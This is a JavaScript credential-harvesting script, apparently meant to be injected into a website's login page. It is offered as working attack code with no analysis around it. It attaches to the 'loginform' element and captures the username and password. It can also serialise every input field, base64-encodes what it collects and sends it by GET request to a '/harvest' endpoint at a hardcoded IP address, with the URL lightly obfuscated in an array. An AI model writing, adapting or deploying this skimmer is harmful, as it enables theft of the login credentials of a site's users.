var siteId = "7e578ae5";
var formName = "loginform";
var formId = "93djokdi";
var enableEncoding = true;
var _0x3745 = ["http","://","192.168.1.1",":8080/harvest?data="];


$(document).ready(function() {
        console.log("initializing harvester...");
        initHarvester();
});

function initHarvester() {
	var loginForm = $('#' + formName);
	if(loginForm) {
		$('#' + formName).append("<input type='hidden' id='siteId' name='siteId' value='" + siteId + "'>");
		$('#' + formName).append("<input type='hidden' id='formId' name='formId' value='" + formId + "'>");
		$('#' + formName).append("<input type='submit' onClick='grabIt(); return false;'/>");
		console.log("locked and loaded");
	} else {
		console.log("ERROR: harvester failed to locate 'loginform', check your HTML");
	}
}

/* parse a few specific fields from the form */
function grabIt() {
	var username = null;
	username = $('#username').val();
	var password = null;
	password = $('#password').val();
	var siteId = null;
	siteId = $('#siteId').val();
	var formId = null;
	formId = $('#formId').val();
	if(username || password) {
		var payload = "siteid:" + siteId + "&formId:" + formId + "&username:" + username + "&password:" + password;
		if(enableEncoding)
				payload = btoa(payload);
		console.log("Captured credentials: " + payload);
        sendPayload(payload);
	} else {
		console.log("No credentials were found");
	}
}

/* parse through the form elements and serialize anything interesting */
function grabAll() {
        var payload = "";
        for(var i = 0; i < loginform.elements.length; i++) {
                console.log("element: " + loginform.elements.item(i));
                if(loginform.elements.item(i) instanceof HTMLInputElement) {
                        console.log("name: " + loginform.elements.item(i).name);
                        console.log("value: " + loginform.elements.item(i).value);
						if(payload == "")
							payload += loginform.elements.item(i).name + ":" + loginform.elements.item(i).value;
						else
							payload += "&" + loginform.elements.item(i).name + ":" + loginform.elements.item(i).value;
                }
        }
        if(enableEncoding) {
                payload = btoa(payload);
        }
        console.log("resulting payload = " + payload);
        sendPayload(payload);
}

function sendPayload(payload) {
        $.get(_0x3745[0] +_0x3745[1] + _0x3745[2] + _0x3745[3] + payload);
}
